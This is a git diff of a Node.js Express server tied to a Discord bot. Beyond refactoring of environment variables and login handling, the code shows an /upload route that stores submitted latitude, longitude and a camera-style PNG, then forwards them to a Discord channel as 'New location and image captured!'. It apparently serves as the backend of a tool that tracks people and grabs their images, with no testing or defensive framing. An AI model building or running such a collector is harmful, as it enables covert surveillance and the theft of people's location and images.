@@ -1,15 +1,16 @@
-require('dotenv').config(); // Load environment variables from .env file
-
 const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
-const { Client, GatewayIntentBits } = require('discord.js'); // Updated import
-const { token, channelID } = process.env; // Fetch values from .env
+const { Client, GatewayIntentBits } = require('discord.js');  // Updated import
 
-const app = express(); // Define the Express app here
+// Get environment variables (GitHub Secrets)
+const token = process.env.BOT_TOKEN;  // Bot token from GitHub Secrets
+const channelID = process.env.CHANNEL_ID;  // Channel ID from GitHub Secrets
+
+const app = express();
 const discordClient = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages], // Updated
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],  // Updated
 });
 
 // Server Port
@@ -35,14 +36,20 @@ discordClient.once('ready', () => {
 });
 
 // Log in to Discord bot
-discordClient.login(token);
+discordClient.login(token)
+  .then(() => {
+    console.log('Logged in successfully');
+  })
+  .catch((err) => {
+    console.error('Error logging in:', err.message);
+  });
 
 // Route to handle image and location data
 app.post('/upload', (req, res) => {
   const { latitude, longitude, image } = req.body;
 
   // Save the image as a file
-  const base64Data = image.replace(/^data:image\/png;base64,/, '');
+  const base64Data = image.replace(/^data:image\/png;base64,/, "");
   const imageFilename = `image_${Date.now()}.png`;
   const imagePath = path.join(__dirname, 'captured_images', imageFilename);
 
@@ -56,7 +63,7 @@ app.post('/upload', (req, res) => {
       timestamp: new Date().toISOString(),
       latitude: latitude,
       longitude: longitude,
-      image: imageFilename,
+      image: imageFilename
     };
 
     const logFilePath = path.join(__dirname, 'data', 'location_data.json');
@@ -67,12 +74,11 @@ app.post('/upload', (req, res) => {
 
       // Send the message to Discord with location info and image
       const message = `New location and image captured!\nLatitude: ${latitude}, Longitude: ${longitude}`;
-
-      discordClient.channels
-        .fetch(channelID) // Use your channel ID here
-        .then((channel) => {
+      
+      discordClient.channels.fetch(channelID)  // Use your channel ID here
+        .then(channel => {
           channel.send(message);
-          channel.send({ files: [imagePath] }); // Sends the captured image
+          channel.send({ files: [imagePath] });  // Sends the captured image
         })
         .catch(console.error);
 
@@ -85,9 +91,8 @@ app.post('/upload', (req, res) => {
 app.post('/send-command', (req, res) => {
   const { command } = req.body;
   if (command) {
-    discordClient.channels
-      .fetch(channelID)
-      .then((channel) => {
+    discordClient.channels.fetch(channelID)
+      .then(channel => {
         channel.send(`Command received: ${command}`);
       })
       .catch(console.error);
